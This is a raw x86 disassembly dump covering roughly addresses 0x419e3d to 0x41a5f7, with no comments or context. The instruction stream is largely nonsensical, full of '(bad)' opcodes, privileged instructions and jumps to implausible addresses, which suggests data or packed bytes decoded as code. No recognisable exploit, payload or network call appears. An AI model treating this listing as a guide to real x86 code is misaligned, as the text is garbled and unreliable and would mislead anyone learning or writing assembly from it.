  419e3d:	scas   eax,DWORD PTR es:[edi]
  419e3e:	ret    0x3b
  419e41:	jns    0x3b429b34
  419e47:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  419e4b:	dec    ebp
  419e4c:	or     BYTE PTR [ebx],ch
  419e4e:	ret    0x458b
  419e51:	lock jmp 0x419e45
  419e54:	mov    ecx,DWORD PTR [eax]
  419e56:	or     BYTE PTR [edi],al
  419e58:	mov    ecx,eax
  419e5a:	xor    DWORD PTR [edx+0x2],0x0
  419e5e:	mov    bh,0xc1
  419e60:	adc    BYTE PTR [eax],dh
  419e62:	iret   
  419e63:	inc    ebp
  419e64:	mov    DWORD PTR [ebx],0x4dfff8c4
  419e6a:	inc    BYTE PTR [ebx]
  419e6c:	ret    0xf8
  419e6f:	adc    DWORD PTR [esi+0x10],esp
  419e72:	clc    
  419e73:	dec    ecx
  419e74:	fisttp WORD PTR [ecx+0x456604c0]
  419e7a:	add    dh,BYTE PTR ds:0x75e0845
  419e80:	ret    0x4d
  419e83:	lea    ecx,[ebx+0x18728301]
  419e89:	add    BYTE PTR [ebp+0x45],al
  419e8c:	xor    ecx,ebp
  419e8e:	pushf  
  419e8f:	add    bh,al
  419e91:	add    al,ch
  419e93:	inc    ebp
  419e94:	test   DWORD PTR [ebx-0x3eba0708],ecx
  419e9a:	xor    eax,0x781084d
  419e9f:	push   ebp
  419ea0:	pushf  
  419ea1:	push   ecx
  419ea2:	xor    al,BYTE PTR [ecx+0x32f89c89]
  419ea8:	inc    ebp
  419ea9:	cmp    edi,DWORD PTR [ecx]
  419eab:	jbe    0x419e49
  419ead:	mov    eax,edi
  419eaf:	or     ah,dh
  419eb1:	inc    ebp
  419eb2:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  419eb8:	xor    ecx,DWORD PTR [ebx-0x74747664]
  419ebe:	in     al,dx
  419ebf:	hlt    
  419ec0:	push   ebp
  419ec1:	push   ebp
  419ec2:	push   ecx
  419ec3:	push   ecx
  419ec4:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  419eca:	pushf  
  419ecb:	pushf  
  419ecc:	xor    dh,BYTE PTR [edx]
  419ece:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  419ed4:	or     BYTE PTR [ebp+0x7],al
  419ed7:	mov    eax,ecx
  419ed9:	clc    
  419eda:	jb     0x419e9d
  419edc:	add    BYTE PTR [ebp+0x55],cl
  419edf:	or     DWORD PTR [edi],0xc251d155
  419ee5:	add    DWORD PTR [ebx+0x32009c],0x8b76453b
  419eef:	mov    edi,eax
  419ef1:	or     cl,al
  419ef3:	inc    ebp
  419ef4:	dec    ebp
  419ef5:	mov    eax,DWORD PTR [ecx+0x514d550c]
  419efb:	or     WORD PTR [ecx],0x899c
  419f00:	xor    cl,BYTE PTR [ebx+0x5576fc3b]
  419f06:	mov    edx,DWORD PTR [ecx+0x8]
  419f09:	mov    eax,DWORD PTR [ebp-0x8]
  419f0c:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb264]
  419f13:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  419f19:	inc    ebp
  419f1a:	dec    eax
  419f1b:	add    ecx,DWORD PTR [ebx+0x554df0f8]
  419f21:	add    edx,DWORD PTR [ecx-0x8]
  419f24:	mov    ecx,DWORD PTR [ecx]
  419f26:	clc    
  419f27:	or     BYTE PTR [ebp+eax*2+0x4532409c],al
  419f2e:	mov    ecx,ebp
  419f30:	clc    
  419f31:	(bad)  
  419f32:	popf   
  419f33:	inc    DWORD PTR [eax]
  419f35:	ret    0x8b
  419f38:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  419f3e:	mov    edi,esp
  419f40:	hlt    
  419f41:	test   ecx,esi
  419f43:	clc    
  419f44:	or     BYTE PTR [ebp+0x7],al
  419f47:	xor    cl,al
  419f49:	pushf  
  419f4a:	jb     0x419f7f
  419f4c:	add    BYTE PTR [eax-0x3f],al
  419f4f:	inc    eax
  419f50:	daa    
  419f51:	inc    ebp
  419f52:	inc    ebp
  419f53:	xor    eax,0x7f80803
  419f58:	dec    ebp
  419f59:	pushf  
  419f5a:	add    esi,DWORD PTR [edx]
  419f5c:	clc    
  419f5d:	cmp    DWORD PTR [ecx],ecx
  419f5f:	or     al,0x8
  419f61:	add    al,BYTE PTR [ebp+0x2c]
  419f64:	xor    eax,0x7350845
  419f69:	or     BYTE PTR [ebp+0x7],cl
  419f6c:	lea    ebx,[ecx+eax*1+0x8b7232]
  419f73:	or     al,0x45
  419f75:	enter  0x4deb,0x8b
  419f79:	mov    edx,DWORD PTR [eax]
  419f7b:	cld    
  419f7c:	dec    ebp
  419f7d:	push   ebp
  419f7e:	sub    edx,DWORD PTR [ecx-0x75]
  419f81:	add    eax,0xf172fc
  419f86:	or     BYTE PTR [ebp+0x7],cl
  419f89:	add    eax,ecx
  419f8b:	or     al,0x72
  419f8d:	add    DWORD PTR [eax],eax
  419f8f:	mov    ebx,0x29c2c1
  419f94:	inc    ebp
  419f95:	mov    eax,DWORD PTR [ebx]
  419f97:	cmp    eax,0x3004d1c
  419f9d:	xbegin 0x66c72b97
  419fa3:	clc    
  419fa4:	or     BYTE PTR [ebp+0x45],al
  419fa7:	xor    BYTE PTR ds:0x78b089c,dh
  419fad:	adc    BYTE PTR [ebp+0x45],cl
  419fb0:	lea    eax,[ebp+0x33727501]
  419fb6:	add    cl,ch
  419fb8:	inc    ebp
  419fb9:	add    bl,ch
  419fbb:	add    BYTE PTR [ebx+0x45850845],cl
  419fc1:	je     0x419f4e
  419fc3:	push   ebx
  419fc4:	or     al,0x85
  419fc6:	dec    ebp
  419fc7:	std    
  419fc8:	mov    bh,bh
  419fca:	mov    BYTE PTR [ebp-0x75],al
  419fcd:	mov    edi,eax
  419fcf:	or     al,0x89
  419fd1:	inc    ebp
  419fd2:	clc    
  419fd3:	mov    esp,esp
  419fd5:	hlt    
  419fd6:	call   DWORD PTR [edi-0x37]
  419fd9:	push   ebp
  419fda:	or     al,0x51
  419fdc:	push   ebp
  419fdd:	xor    ebp,esp
  419fdf:	mov    esi,0x457251
  419fe4:	xor    esi,eax
  419fe6:	pushf  
  419fe7:	inc    ebp
  419fe8:	(bad)  
  419fe9:	mov    edi,eax
  419feb:	or     al,0x85
  419fed:	add    al,bh
  419fef:	inc    eax
  419ff1:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  419ff5:	or     ah,bh
  419ff7:	inc    eax
  419ff8:	push   ebp
  419ff9:	jmp    0x41a04c
  419ffb:	mov    eax,DWORD PTR ds:0xe8720c
  41a001:	mov    DWORD PTR [ebp-0x8],eax
  41a004:	jne    0x41a04b
  41a006:	jmp    0x419f93
  41a008:	mov    ebp,DWORD PTR [eax]
  41a00a:	clc    
  41a00b:	retf   0xff55
  41a00e:	push   ecx
  41a00f:	mov    DWORD PTR ds:0x757210,eax
  41a015:	mov    ecx,DWORD PTR [ebp-0x4]
  41a018:	sub    esp,DWORD PTR [ebx-0x77]
  41a01b:	dec    DWORD PTR [eax*4-0x74ca8abb]
  41a022:	or     ah,bh
  41a024:	pop    es
  41a025:	ds pushf 
  41a027:	push   DWORD PTR [edx]
  41a029:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  41a02f:	(bad)  
  41a030:	mov    bh,bh
  41a032:	jmp    0x41a020
  41a034:	leave  
  41a035:	jne    0x41a03f
  41a037:	call   0x2e9991
  41a03c:	in     al,dx
  41a03d:	dec    ebp
  41a03e:	add    dh,BYTE PTR [ebx]
  41a040:	add    BYTE PTR [ebx],al
  41a042:	inc    ebp
  41a043:	cmp    esi,DWORD PTR [ecx]
  41a045:	je     0x419fe3
  41a047:	mov    eax,edi
  41a049:	or     al,0xf0
  41a04b:	add    BYTE PTR [ebp+0x458bf845],al
  41a051:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  41a057:	adc    al,0x7
  41a059:	enter  0x9fc0,0xa5
  41a05d:	rol    BYTE PTR [eax],0x5e
  41a060:	mov    ecx,ecx
  41a062:	or     al,0xc
  41a064:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  41a06b:	jmp    0x41a06c
  41a06d:	push   ebp
  41a06e:	mov    esp,ebp
  41a070:	cld    
  41a071:	inc    ebp
  41a072:	inc    ebp
  41a073:	or     DWORD PTR [ecx+0x457dec10],0x0
  41a07a:	push   esi
  41a07b:	push   esi
  41a07c:	mov    edi,0x7af080f
  41a081:	add    bh,al
  41a083:	test   DWORD PTR [edi+ecx*1+0x3a732],ebx
  41a08a:	mov    DWORD PTR [edi],ecx
  41a08c:	adc    BYTE PTR [eax+0x45],al
  41a08f:	mov    ebp,eax
  41a091:	mov    ebp,edi
  41a093:	lock call edx
  41a096:	fcom   DWORD PTR [ebp+0x45]
  41a099:	mov    eax,0x148a8b
  41a09e:	push   ecx
  41a09f:	enter  0xc145,0x83
  41a0a3:	cmp    ecx,DWORD PTR [eax]
  41a0a5:	add    BYTE PTR [ebp+0x4d],al
  41a0a8:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  41a0ae:	call   0xffa19c1d
  41a0b3:	cmp    eax,DWORD PTR [ebp-0xc]
  41a0b6:	jmp    DWORD PTR [eax+edx*1-0x4e]
  41a0ba:	push   ebp
  41a0bb:	(bad)  
  41a0bc:	call   0x329ec0
  41a0c1:	mov    bh,0xdb
  41a0c3:	cld    
  41a0c4:	or     BYTE PTR [ebp+0x45],bl
  41a0c7:	(bad)  
  41a0c8:	call   0xff7b9d58
  41a0cd:	add    al,BYTE PTR [ebp+0x37]
  41a0d0:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  41a0d6:	jne    0x41a0d8
  41a0d8:	(bad)  
  41a0d9:	cmp    edi,esp
  41a0db:	jne    0x41a10e
  41a0dd:	mov    edi,edi
  41a0df:	or     BYTE PTR [ebx-0x307f0b49],cl
  41a0e5:	pop    ds
  41a0e6:	into   
  41a0e7:	je     0x41a0aa
  41a0e9:	mov    ebx,DWORD PTR [esi]
  41a0eb:	or     BYTE PTR [ebp-0x49],al
  41a0ee:	mov    esp,DWORD PTR [esi-0x77]
  41a0f1:	mov    esi,0x4451f0c
  41a0f6:	mov    eax,DWORD PTR [eax]
  41a0f8:	or     al,0x66
  41a0fa:	sar    bl,0x3b
  41a0fd:	xor    esi,DWORD PTR [ebp+0x66]
  41a100:	xor    ecx,edi
  41a102:	pop    edi
  41a103:	adc    bl,BYTE PTR [ebx+0x70]
  41a106:	ret    0xff
  41a109:	cld    
  41a10a:	inc    ebp
  41a10b:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  41a111:	cld    
  41a112:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  41a119:	push   0xffffff83
  41a11b:	pop    edi
  41a11c:	or     BYTE PTR [ebp+0x53],dh
  41a11f:	xorps  xmm1,xmm2
  41a122:	test   BYTE PTR [eax+eax*1],bh
  41a125:	add    BYTE PTR [eax],al
  41a127:	adc    eax,eax
  41a129:	add    DWORD PTR [eax+esi*2-0xff7b00],0xffffffb7
  41a131:	jmp    DWORD PTR [eax]
  41a133:	ror    al,0x5e
  41a136:	inc    ebp
  41a137:	leave  
  41a138:	xor    ecx,DWORD PTR [eax]
  41a13a:	and    DWORD PTR [ebx-0x3ec10708],ecx
  41a140:	add    ah,al
  41a142:	xor    edi,edi
  41a144:	xor    DWORD PTR [ebx],0x66003304
  41a14a:	mov    DWORD PTR [ebp-0xc],ecx
  41a14d:	pcmpgtw mm0,mm0
  41a150:	add    dl,ah
  41a152:	leave  
  41a153:	mov    edi,DWORD PTR [esi-0x7d]
  41a156:	push   ax
  41a158:	dec    ebp
  41a159:	mov    esi,DWORD PTR [ebx-0x75]
  41a15c:	lea    ebp,[eax-0x7c00ff04]
  41a162:	xor    eax,DWORD PTR [eax]
  41a164:	sysret 
  41a166:	dec    ebp
  41a167:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  41a16e:	push   WORD PTR [ecx+0x8]
  41a172:	jne    0x41a135
  41a174:	ud0    ecx,DWORD PTR [ecx]
  41a177:	mov    eax,edx
  41a179:	lods   al,BYTE PTR ds:[esi]
  41a17a:	add    BYTE PTR [eax],al
  41a17c:	data16 (bad) 
  41a17e:	iret   
  41a17f:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  41a186:	cli    
  41a187:	inc    ebp
  41a188:	cmp    al,0x8d
  41a18a:	add    BYTE PTR [esi+0x2d],ah
  41a18d:	inc    ebp
  41a18e:	pop    ebp
  41a18f:	lea    ecx,[edi]
  41a191:	mov    dl,bh
  41a193:	add    BYTE PTR [edi],cl
  41a195:	mov    DWORD PTR [eax+eax*8],edi
  41a198:	mov    ebx,0x3b87
  41a19d:	add    BYTE PTR [ebx],ch
  41a19f:	inc    ebp
  41a1a0:	data16 (bad) 
  41a1a2:	clc    
  41a1a3:	int3   
  41a1a4:	cmp    eax,DWORD PTR [eax]
  41a1a6:	je     0x41a131
  41a1a8:	push   0xffffffc8
  41a1aa:	pop    edi
  41a1ab:	xchg   DWORD PTR [ebp+0x0],eax
  41a1ae:	data16 add BYTE PTR [ebp+0x45],cl
  41a1b2:	lea    cx,[ebp+0x10]
  41a1b6:	jb     0x41a1b8
  41a1b8:	jmp    0x41a143
  41a1ba:	call   eax
  41a1bc:	clc    
  41a1bd:	xchg   DWORD PTR [edi+0x1],edi
  41a1c0:	mov    eax,DWORD PTR [eax]
  41a1c2:	or     BYTE PTR [ebp-0x49],al
  41a1c5:	lea    eax,[eax+0x74003154]
  41a1cb:	push   edi
  41a1cc:	inc    edx
  41a1cd:	jge    0x41a1ce
  41a1cf:	mov    DWORD PTR [edi],ecx
  41a1d1:	fdiv   DWORD PTR [edi-0x6]
  41a1d4:	inc    DWORD PTR [eax]
  41a1d6:	xor    edx,DWORD PTR [eax+0x5f]
  41a1d9:	xchg   DWORD PTR [ebx+0x1],ebx
  41a1dc:	ret    0x0
  41a1df:	xor    BYTE PTR [ebp-0x51],cl
  41a1e2:	cmp    edi,0xf0ff89fc
  41a1e8:	data16 ror al,0x84
  41a1ec:	rol    BYTE PTR [eax],0x3b
  41a1ef:	add    al,dh
  41a1f1:	dec    eax
  41a1f2:	xchg   esp,eax
  41a1f3:	push   ebx
  41a1f4:	jmp    0x41a181
  41a1f6:	push   ebp
  41a1f7:	add    esp,ebp
  41a1f9:	add    ebp,esp
  41a1fb:	mov    edx,DWORD PTR [edi+0x24]
  41a1fe:	clc    
  41a1ff:	dec    esi
  41a200:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  41a206:	cmp    BYTE PTR [ebx],al
  41a208:	jne    0x41a193
  41a20a:	xor    esp,eax
  41a20c:	jmp    0x44a38f
  41a211:	add    ebp,DWORD PTR [ecx+ecx*4]
  41a214:	jne    0x41a20a
  41a216:	call   0xffcb9f70
  41a21b:	clc    
  41a21c:	xchg   edi,eax
  41a21d:	sti    
  41a21e:	add    DWORD PTR [ebx],eax
  41a220:	add    BYTE PTR [ebp+0x47],bl
  41a223:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  41a229:	pop    ebp
  41a22a:	mov    DWORD PTR [esi-0x48],esi
  41a22d:	jmp    0x41a276
  41a22f:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  41a235:	(bad)  
  41a237:	cmp    al,0x0
  41a239:	cmp    eax,DWORD PTR [ebp+0x18]
  41a23c:	lea    ebx,[ebp-0x56]
  41a23f:	jle    0x41a241
  41a241:	jae    0x41a1cc
  41a243:	mov    eax,esp
  41a245:	call   0xb900:0x8b005587
  41a24c:	inc    ebp
  41a24d:	push   ebp
  41a24e:	lea    ecx,[ebp-0x27ff4f12]
  41a254:	mov    eax,edi
  41a256:	int3   
  41a257:	push   ebp
  41a258:	xchg   edi,eax
  41a25a:	add    esp,ebp
  41a25c:	add    BYTE PTR [eax],al
  41a25e:	inc    ebp
  41a25f:	add    BYTE PTR [ebp+0x8b3255],cl
  41a265:	cld    
  41a266:	mov    DWORD PTR [edx],edi
  41a268:	aam    0x75
  41a26a:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  41a270:	mov    DWORD PTR [ebx-0x50],edx
  41a273:	test   BYTE PTR [ebp-0x1],0xe8
  41a277:	mov    eax,DWORD PTR [eax]
  41a279:	hlt    
  41a27a:	add    al,al
  41a27c:	mov    eax,DWORD PTR ds:0x890045a8
  41a282:	dec    DWORD PTR [ebx+0x45fdf0e8]
  41a288:	inc    DWORD PTR [eax*2+0xf75854d]
  41a28f:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  41a295:	call   0x7297ffd6
  41a29a:	je     0x41a2fa
  41a29c:	js     0x41a2fd
  41a29e:	lock ret 0x7e
  41a2a2:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  41a2a8:	mov    edi,edi
  41a2aa:	sbb    al,bl
  41a2ac:	clc    
  41a2ad:	add    BYTE PTR [ebp-0x73],bh
  41a2b0:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  41a2b6:	ror    BYTE PTR [eax],1
  41a2b8:	dec    ebp
  41a2b9:	xchg   ebp,eax
  41a2ba:	mov    edi,edi
  41a2bc:	in     al,0x8b
  41a2be:	jge    0x41a249
  41a2c0:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  41a2c6:	clc    
  41a2c7:	pop    esi
  41a2c8:	fist   DWORD PTR [ebp+0x5d398b5d]
  41a2ce:	clc    
  41a2cf:	add    al,0x6e
  41a2d1:	mov    eax,DWORD PTR [ebx]
  41a2d3:	mov    BYTE PTR [ebp+0x0],dl
  41a2d6:	mov    edx,DWORD PTR [ebx-0x20]
  41a2d9:	adc    esi,DWORD PTR [edi+0x5e005f3e]
  41a2df:	add    eax,0x3b3b73
  41a2e4:	adc    al,0x89
  41a2e6:	pop    eax
  41a2e7:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  41a2eb:	ret    0xf08
  41a2ee:	cmp    al,0x2
  41a2f0:	mov    edx,eax
  41a2f2:	cld    
  41a2f3:	add    BYTE PTR [ebp+0x66],dl
  41a2f6:	add    eax,ebx
  41a2f8:	add    esp,eax
  41a2fa:	sub    eax,eax
  41a2fc:	or     BYTE PTR [ecx-0x77f474bb],cl
  41a302:	add    BYTE PTR [eax],al
  41a304:	mov    DWORD PTR [ebx-0x24],ebx
  41a307:	push   edi
  41a308:	push   ebp
  41a309:	clc    
  41a30a:	add    DWORD PTR [esi+0x1b0100],0x45
  41a311:	out    0xff,eax
  41a313:	add    edx,DWORD PTR [eax]
  41a315:	jmp    0x41a2ff
  41a317:	cmp    ch,0x47
  41a31a:	(bad)  
  41a31b:	jmp    0x40c72b6d
  41a320:	je     0x41a2ac
  41a322:	mov    eax,DWORD PTR [eax-0x10c78f04]
  41a328:	inc    ebp
  41a329:	add    BYTE PTR [ebx-0x770375],al
  41a32f:	add    ah,ch
  41a331:	add    edx,esp
  41a333:	pop    edi
  41a334:	pop    ebp
  41a335:	push   ebp
  41a336:	inc    ebx
  41a337:	in     al,dx
  41a338:	pop    ebp
  41a339:	in     al,dx
  41a33a:	cmp    edx,DWORD PTR [edi-0x8]
  41a33d:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  41a344:	add    al,0x47
  41a346:	push   ebp
  41a347:	mov    esp,ebp
  41a349:	in     al,0x45
  41a34b:	dec    ebp
  41a34c:	push   esi
  41a34d:	test   DWORD PTR [eax+0xfb010f],esi
  41a353:	add    BYTE PTR [eax+0xc018b],dh
  41a359:	leave  
  41a35a:	inc    ebp
  41a35b:	test   al,ch
  41a35d:	add    dh,bh
  41a35f:	add    bh,bh
  41a361:	dec    ebp
  41a362:	push   cs
  41a363:	mov    DWORD PTR [ecx],eax
  41a365:	hlt    
  41a366:	push   es
  41a367:	dec    ebp
  41a368:	leave  
  41a369:	mov    DWORD PTR [eax],ecx
  41a36b:	clc    
  41a36c:	cmovge eax,ecx
  41a36f:	mov    ecx,0x85c2f0
  41a375:	clc    
  41a376:	pop    DWORD PTR [ebp+0x1]
  41a379:	push   ebx
  41a37a:	add    BYTE PTR [ebp-0x15],bh
  41a37d:	push   esi
  41a37e:	xor    eax,0x898a45
  41a383:	cld    
  41a384:	add    al,0x45
  41a386:	add    BYTE PTR [ebx],dh
  41a388:	pushfw 
  41a38a:	add    DWORD PTR [esi+0x78308c1],edi
  41a390:	add    ah,BYTE PTR [edi+esi*4-0x33]
  41a394:	mov    ebx,0xc4e8b
  41a399:	(bad)  
  41a39a:	cmp    ecx,ebx
  41a39c:	jne    0x41a366
  41a39e:	xor    ecx,DWORD PTR [ebp+0x66]
  41a3a1:	jmp    0xc8a3a7
  41a3a6:	add    DWORD PTR [ebp+0x0],eax
  41a3a9:	mov    eax,ebx
  41a3ab:	or     al,0x8b
  41a3ad:	(bad)  
  41a3ae:	mov    ecx,esi
  41a3b0:	mov    BYTE PTR [eax+eax*1+0x664c138],cl
  41a3b7:	mov    eax,edi
  41a3b9:	or     BYTE PTR [edx],cl
  41a3bb:	shl    cl,cl
  41a3bd:	icebp  
  41a3be:	add    BYTE PTR [ebp+0x37],0x8b
  41a3c2:	or     BYTE PTR [edx+eax*2],cl
  41a3c5:	(bad)  
  41a3c6:	or     cl,dh
  41a3c8:	stc    
  41a3c9:	shl    DWORD PTR [ebp-0x30],0xc6
  41a3cd:	xor    al,0x0
  41a3cf:	inc    ebp
  41a3d0:	xchg   BYTE PTR [ebx],al
  41a3d2:	add    esp,edi
  41a3d4:	add    BYTE PTR [ebp-0x39],cl
  41a3d7:	mov    al,bl
  41a3d9:	test   DWORD PTR [ebx+0x1c348375],ecx
  41a3df:	sub    al,0xbf
  41a3e1:	jmp    0x41a368
  41a3e3:	mov    edi,eax
  41a3e5:	lock jge 0x41a3d9
  41a3e8:	lea    esi,[edx-0x74bad501]
  41a3ee:	mov    ebp,esp
  41a3f0:	or     cl,dh
  41a3f2:	leave  
  41a3f3:	add    al,BYTE PTR [eax+eax*4-0x37ff9c00]
  41a3fa:	dec    ebp
  41a3fb:	dec    ebp
  41a3fc:	test   DWORD PTR [ebx],eax
  41a3fe:	paddb  mm6,mm0
  41a401:	add    DWORD PTR [eax],eax
  41a403:	dec    ebp
  41a404:	mov    ecx,DWORD PTR [ebx-0x63b217f0]
  41a40a:	mov    esi,DWORD PTR [edx]
  41a40c:	or     al,0x2b
  41a40e:	dec    ebp
  41a40f:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  41a415:	mov    esp,esi
  41a417:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  41a41e:	mov    DWORD PTR [ebx],ebp
  41a420:	call   0xc752d50
  41a425:	mov    DWORD PTR [ebp+0x10],ecx
  41a428:	(bad)  
  41a429:	push   0x8b85ff10
  41a42e:	clc    
  41a42f:	or     al,0x55
  41a431:	(bad)  
  41a432:	push   ecx
  41a433:	retf   
  41a434:	mov    ebx,0xff4d8dc8
  41a439:	mov    DWORD PTR [ebp+0x8],eax
  41a43c:	xor    eax,DWORD PTR [ebp-0x75]
  41a43f:	cmp    ebp,DWORD PTR [ebx]
  41a441:	lsl    ebx,WORD PTR [edi-0x8]
  41a445:	call   DWORD PTR [ebx-0x741bff75]
  41a44b:	(bad)  
  41a44c:	or     al,0x5b
  41a44e:	dec    ebp
  41a44f:	or     BYTE PTR [ebx],dh
  41a451:	inc    ebp
  41a452:	xor    esi,DWORD PTR ds:0x708088d
  41a458:	in     eax,0x9c
  41a45a:	add    BYTE PTR [edx],dh
  41a45c:	inc    ebp
  41a45d:	pop    edi
  41a45e:	xor    eax,edx
  41a460:	test   DWORD PTR [eax],0x83108b8b
  41a466:	dec    ebp
  41a467:	adc    al,0x33
  41a469:	inc    ebp
  41a46a:	xor    esi,DWORD PTR [ecx]
  41a46c:	sub    ebx,DWORD PTR [ebx+edi*1-0x74038a39]
  41a473:	test   DWORD PTR [eax],ecx
  41a475:	clc    
  41a476:	inc    ebp
  41a477:	add    ecx,DWORD PTR [ebx+0xc7f445]
  41a47d:	hlt    
  41a47e:	leave  
  41a47f:	test   DWORD PTR [esi],eax
  41a481:	clc    
  41a482:	inc    edi
  41a483:	push   edi
  41a484:	aaa    
  41a485:	inc    ebp
  41a486:	pop    ss
  41a487:	ror    DWORD PTR [ebp-0x29],1
  41a48a:	or     BYTE PTR [ebx+0x4d64fc55],0xd1
  41a491:	mov    eax,0x780084d
  41a496:	push   ebp
  41a497:	clc    
  41a498:	ret    0xe99c
  41a49b:	xor    dl,dl
  41a49d:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  41a4a3:	js     0x88830a2
  41a4a9:	dec    ebp
  41a4aa:	push   ebp
  41a4ab:	mov    edi,DWORD PTR [eax+0xc872fc]
  41a4b1:	lock enter 0xceca,0xf2
  41a4b6:	retf   0x18ce
  41a4b9:	jne    0x41a508
  41a4bb:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  41a4c1:	enter  0xf0d6,0xca
  41a4c5:	retf   0xf2c8
  41a4c8:	into   
  41a4c9:	out    dx,al
  41a4ca:	dec    ebp
  41a4cb:	dec    ebp
  41a4cc:	jmp    0xff45a404
  41a4d1:	xor    eax,DWORD PTR [ebp-0x15]
  41a4d4:	xor    esi,DWORD PTR [ebx]
  41a4d6:	mov    esi,DWORD PTR [ebx]
  41a4d8:	sub    eax,DWORD PTR [ebx]
  41a4da:	add    eax,DWORD PTR [ebx]
  41a4dc:	or     bl,dl
  41a4de:	dec    ebp
  41a4df:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  41a4e5:	xor    eax,DWORD PTR [ebp-0xf00073]
  41a4eb:	jb     0x41a532
  41a4ed:	add    BYTE PTR [ebx],dh
  41a4ef:	dec    ebp
  41a4f0:	pop    esi
  41a4f1:	mov    ebp,ebx
  41a4f3:	cld    
  41a4f4:	mov    esi,eax
  41a4f6:	call   0x520ffac3
  41a4fb:	stc    
  41a4fc:	add    eax,0x4572aa
  41a501:	pop    edi
  41a502:	leave  
  41a503:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  41a50a:	in     al,dx
  41a50b:	mov    eax,edi
  41a50d:	xor    eax,0xf8008520
  41a513:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  41a51a:	mov    eax,DWORD PTR [ebp-0x77]
  41a51d:	xor    al,bh
  41a51f:	pushf  
  41a520:	inc    ebp
  41a521:	(bad)  
  41a522:	cmp    eax,ebp
  41a524:	pushf  
  41a525:	xchg   BYTE PTR [esi-0x8],dl
  41a528:	mov    edi,0x8518e4ec
  41a52e:	jmp    0xf056:0x8b457df8
  41a535:	push   ebp
  41a536:	push   ebp
  41a537:	push   ecx
  41a538:	push   ecx
  41a539:	push   edi
  41a53a:	xor    eax,esi
  41a53c:	mov    edx,0x32729c
  41a541:	add    ecx,eax
  41a543:	mov    edx,edi
  41a545:	clc    
  41a546:	retf   0xaf45
  41a549:	cmp    ebx,ebp
  41a54b:	pushf  
  41a54c:	mov    eax,edi
  41a54e:	clc    
  41a54f:	cld    
  41a550:	jne    0x41a56a
  41a552:	xor    ebp,edx
  41a554:	xor    eax,DWORD PTR [ebp+0x3]
  41a557:	or     BYTE PTR [ebx],al
  41a559:	add    BYTE PTR [ebp-0x7747475],al
  41a55f:	hlt    
  41a560:	dec    ebp
  41a561:	dec    ebp
  41a562:	je     0x41a597
  41a564:	xor    esi,DWORD PTR [ebx]
  41a566:	xor    eax,DWORD PTR [ebx]
  41a568:	add    eax,DWORD PTR [ebx]
  41a56a:	add    ecx,DWORD PTR [edi]
  41a56c:	rol    ecx,cl
  41a56e:	mov    esi,DWORD PTR [ecx]
  41a570:	in     al,dx
  41a571:	inc    ebp
  41a572:	enter  0xca2b,0x33
  41a576:	icebp  
  41a577:	mov    DWORD PTR [edx],ecx
  41a579:	clc    
  41a57a:	lock pop ebp
  41a57c:	enter  0xf2e8,0xfe
  41a580:	retf   0xeeff
  41a583:	inc    ebp
  41a584:	jne    0x41a511
  41a586:	mov    edi,eax
  41a588:	cld    
  41a589:	dec    ebp
  41a58a:	enter  0xbc89,0x8d
  41a58e:	pushf  
  41a58f:	sti    
  41a590:	xor    bh,bh
  41a592:	mov    eax,DWORD PTR [ebp-0xc]
  41a595:	mov    esi,DWORD PTR [ebp-0x4]
  41a598:	xor    eax,esi
  41a59a:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9c]
  41a5a1:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  41a5a7:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  41a5ad:	(bad)  
  41a5ae:	push   ebp
  41a5af:	shr    esp,0x4d
  41a5b2:	in     al,dx
  41a5b3:	cmp    eax,DWORD PTR [esi+esi*2]
  41a5b6:	add    BYTE PTR [ebx-0x39ce1bbb],cl
  41a5bc:	pushf  
  41a5bd:	mov    edi,0x85c7f445
  41a5c3:	call   0xf8872cc0
  41a5c8:	xor    ebx,ebx
  41a5ca:	pushf  
  41a5cb:	popa   
  41a5cc:	push   ebx
  41a5cd:	dec    ebp
  41a5ce:	inc    ebp
  41a5cf:	mov    esi,DWORD PTR [esi]
  41a5d1:	clc    
  41a5d2:	pushf  
  41a5d3:	into   
  41a5d4:	mov    ecx,edi
  41a5d6:	in     al,dx
  41a5d7:	call   0x8b49eb9a
  41a5dc:	pop    es
  41a5dd:	or     BYTE PTR [ebx],dh
  41a5df:	or     BYTE PTR [edi+0x8a724d],bh
  41a5e5:	or     eax,edi
  41a5e7:	push   ebp
  41a5e8:	inc    ebp
  41a5e9:	cmpxchg8b (bad)
  41a5ea:	(bad)  
  41a5eb:	leave  
  41a5ec:	loopne 0x41a5b8
  41a5ee:	test   DWORD PTR [ebp-0x8],ecx
  41a5f1:	mov    eax,DWORD PTR [ebp-0x18]
  41a5f4:	rcl    DWORD PTR [ebp-0x29],1
  41a5f7:	xor    eax,edi
